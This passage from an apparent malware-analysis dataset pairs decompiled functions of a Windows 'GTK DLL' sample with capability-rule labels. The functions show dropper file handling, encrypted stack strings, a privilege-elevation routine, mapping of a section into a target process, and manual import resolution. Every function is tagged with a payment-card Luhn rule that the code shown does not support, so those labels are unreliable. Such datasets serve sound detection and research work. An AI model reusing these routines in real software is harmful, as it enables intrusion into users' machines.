        "decompiled_code": "\nvoid __fastcall fcn.0040611c(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x427aa0 = 0;\n        fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReadServiceDllFile : Read and remove file \\'%ws\\'\", 0x53);\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x427aa0 = *0x427aa0 >> 8 ^ *((uVar1 ^ *0x427aa0 & 0xff) * 4 + 0x414dc0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReadServiceDllFile : CurrentModuleCheckSum : %d\", 0x60);\n            iVar2 = fcn.00406ef1(0x427d2c);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 524
    },
    "0040759a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040759a(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41b2ec;\n    uStack104 = *0x41b2e8;\n    uStack108 = *0x41b2e4;\n    name = *0x41b2e0;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x427d50;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x41b2f0;\n    uStack92 = *0x41b2f4;\n    uStack88 = *0x41b2f8;\n    uStack84 = *0x41b2fc;\n    var_3ch = *0x41b2d0;\n    uStack60 = *0x41b2d4;\n    uStack56 = *0x41b2d8;\n    uStack52 = *0x41b2dc;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x427d58 = uVar10 ^ uVar8;\n        *0x427d5c = uVar10 << 10 | uVar10 >> 0x16;\n        *0x427d50 = uVar8;\n        *0x427d54 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1724
    },
    "00407c05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00407c05(void)\n\n{\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > IsUserGuest : [ENTERED]\", 0x1a5);\n    var_8h = 0xc;\n    var_4h = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &var_14h, &var_8h);\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, &var_14h, &var_4h);\n        fcn.00403bde(\"GTK DLL: globals.cpp:%d > IsUserGuest : Check if user is Guest = %u\", 0x1b0);\n    }\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > IsUserGuest : [LEAVED]\", 0x1b4);\n    return var_4h;\n}\n",
        "token_count": 247
    },
    "00407c7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00407c7d(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    cVar6 = '\\0';\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x7a) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformationLength);\n                puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                if (puVar3 != NULL) {\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                      (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                    if (iVar1 != 0) {\n                        puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3);\n                        if ((puVar4 != NULL) && (*puVar4 != 0)) {\n                            puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1);\n                            if (puVar5 != NULL) {\n                                if (*puVar5 < 0x2000) {\n                                    cVar6 = '\\x01';\n                                }\n                                else {\n                                    cVar6 = '\\x03' - (*puVar5 < 0x3000);\n                                }\n                            }\n                        }\n                    }\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar6;\n}\n",
        "token_count": 526
    },
    "00407dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407dc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_4h;\n    \n    puVar2 = &var_ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = 0;\n    iVar1 = (*_sym.imp.ntdll.dll_NtMapViewOfSection)();\n    if (iVar1 < 0) {\n        fcn.00403bde(\"GTK DLL: acimage.cpp:%d > ImgMapSection : Failed mapping a section to the target process, status %p\"\n                     , 0x8c);\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: acimage.cpp:%d > ImgMapSection : A section of %p bytes mapped to the target process at %p\"\n                     , 0x88);\n    }\n    (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar1);\n    return;\n}\n",
        "token_count": 256
    },
    "00409c4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409c4c(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint uVar10;\n    char *pcVar11;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint pExecInfo;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    uint var_7ch;\n    uint hObject;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    sub.ntdll.dll_memset(&lpDst, 0, 0x410);\n    sub.ntdll.dll_memset(&ARG_0, 0, 0x208);\n    sub.ntdll.dll_memset(&lpszShortPath, 0, 0x208);\n    var_44h = 0x71184560;\n    var_40h = 0x48206e3d;\n    var_3ch = 0x71064521;\n    var_38h = 0x486b6e26;\n    var_34h = 0x711c4519;\n    var_30h = 0x483d6e2d;\n    var_2ch = 0x710a4531;\n    var_28h = 0x487d6e39;\n    var_24h = 0x71334577;\n    var_20h = 0x48236e37;\n    var_1ch = 0x71414521;\n    var_18h = 0x48366e31;\n    var_14h = 0x716f4520;\n    var_8h = 0x716f4545;\n    var_4h = 0x484e6e54;\n    fcn.00401000(0x68);\n    iVar4 = var_58h;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_58h;\n        uVar5 = uVar6 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_8h + uVar5) ^ puVar1[&var_44h - var_58h];\n    } while (uVar6 < 0x34);\n    fcn.00403bde(\"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : decrypt (wide char) %s -> %ws\", 0x1a);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    fcn.00403bde(\"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : self %ws\", 0x1d);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(param_1, &lpszShortPath, 0x104);\n    var_30h = 0x6b783855;\n    var_2ch = 0x75585304;\n    var_28h = 0x6718571a;\n    var_24h = 0x38147827;\n    var_20h = 0x53136b25;\n    var_1ch = 0x571d7558;\n    var_18h = 0x78716718;\n    var_14h = CONCAT22(var_14h._2_2_, 0x3875);\n    var_10h = 0x6b573875;\n    var_ch._0_2_ = 0x5367;\n    var_ch._2_1_ = 0x78;\n    fcn.00401000(0x3c);\n    iVar4 = var_5ch;\n    iVar8 = 0;\n    var_54h = 7;\n    do {\n        puVar1 = iVar8 + var_5ch;\n        iVar7 = iVar8 % 7;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_10h + iVar7) ^ puVar1[&var_30h - var_5ch];\n    } while (iVar8 < 0x1e);\n    pcVar11 = \"wzsStartParamsTemplate_EncryptedStackedBuffer\";\n    uVar10 = 0x23;\n    pcVar9 = \"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : decrypt (wide char) %s -> %ws\";\n    iVar8 = var_5ch;\n    fcn.00403bde(\"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : decrypt (wide char) %s -> %ws\", 0x23);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, &lpszShortPath, pcVar9, uVar10, pcVar11, iVar8);\n    sub.ntdll.dll_memset(&pExecInfo, 0, 0x3c);\n    var_50h = 0x39346534;\n    var_4ch = 0x462e671c;\n    var_48h = 0x72394116;\n    var_8h = 0x39416546;\n    var_4h = var_4h & 0xff000000 | 0x4f6772;\n    fcn.00401000(0x18);\n    iVar4 = var_10h;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_10h;\n        iVar7 = iVar8 % var_54h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_50h - var_10h];\n    } while (iVar8 < 0xc);\n    fcn.00403bde(\"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : decrypt (wide char) %s -> %ws\", 0x29);\n    pExecInfo = 0x3c;\n    var_88h = &lpDst;\n    var_8ch = iVar4;\n    var_84h = &ARG_0;\n    var_7ch = 3;\n    var_94h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_90h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar8 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    while (iVar8 == 0) {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : ShellExecuteEx() %d\", 0x40);\n        if (iVar8 != 0x4c7) goto code_r0x00409f58;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        var_90h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar8 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    }\n    fcn.00403bde(\"GTK DLL: low_elevation.cpp:%d > ElevateRunasByCmdExecution : ShellExecuteEx(%ws %ws) ok\", 0x39);\ncode_r0x00409f58:\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    uVar10 = (*pcVar3)(0, var_5ch);\n    (*pcVar2)(uVar10);\n    uVar10 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar10);\n    return 1;\n}\n",
        "token_count": 2078
    },
    "0040a076": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a076(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = *param_2 * 0x19660d + 0x3c6ef35f;\n    *param_1 = iVar1;\n    iVar1 = iVar1 * 0x19660d + 0x3c6ef35f;\n    *(param_1 + 1) = iVar1;\n    iVar1 = iVar1 * 0x19660d + 0x3c6ef35f;\n    uVar2 = 0;\n    *param_2 = iVar1;\n    *(param_1 + 6) = iVar1;\n    do {\n        iVar1 = *param_2 * 0x19660d + 0x3c6ef35f;\n        *(param_1 + uVar2 + 8) = iVar1;\n        uVar2 = uVar2 + 1;\n        *param_2 = iVar1;\n    } while (uVar2 < 8);\n    return;\n}\n",
        "token_count": 252
    },
    "0040a17f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0040a17f(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint var_14h;\n    uint lpString2;\n    \n    puVar5 = NULL;\n    iVar4 = 0x27;\n    fcn.0040a076();\n    iVar2 = fcn.0040a0c6();\n    if (iVar2 != 0) {\n        if (in_EDX != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar4 = iVar4 + 0x27;\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4 * 2);\n        puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (puVar5 != NULL) {\n            *puVar5 = 0;\n            if (in_EDX != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(puVar5);\n            }\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(puVar5, iVar2);\n        }\n        uVar3 = (*pcVar1)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return puVar5;\n}\n",
        "token_count": 345
    },
    "0040a209": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040a209(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint s2;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 0;\n    var_8h = 0;\n    uVar1 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = param_2;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar1) {\n                sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n                iVar2 = iVar2 + uVar1;\n                uVar1 = 0;\n            }\n            *(&s2 + uVar1) = *(var_8h + param_1) ^ var_1h;\n            uVar1 = uVar1 + 1;\n            var_1h._0_1_ = var_1h + (var_8h % 0x85) * '\\x03';\n            var_8h = var_8h + 1;\n        } while (var_8h < var_ch);\n        if (uVar1 != 0) {\n            sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "0040a49b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a49b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 117
    },
    "0040a4ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a4ba(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0040a49b();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 356
    },
    "0040a540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a540(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "0040a5a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a5a7(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0) {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    else {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 337
    },
    "0040a60c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040a60c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x427d7c;\n    iVar4 = *(*(*0x427d7c + 0x3c) + 0x80 + *0x427d7c);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x427d7c;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.0040a5a7(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 431
    },
    "0040a7e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040a7e2(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint lpUrlComponents;\n    uint s;\n    uint var_2ch;\n    uint var_28h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x38);\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 224
    },
    "0040ac84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ac84(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x38382014;\n    var_1ch = 0x69591914;\n    var_18h = 0x35382c37;\n    var_14h._0_1_ = 0x61;\n    var_10h = 0x4c4a4942;\n    var_ch = 0x38357861;\n    fcn.00401000(0xd);\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_4h;\n        uVar5 = uVar8 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_10h + uVar5) ^ puVar1[&var_20h - var_4h];\n    } while (uVar8 < 0xd);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > initVitualQuery : decrypt (char) %s -> %s\", 0x8c);\n    var_20h = 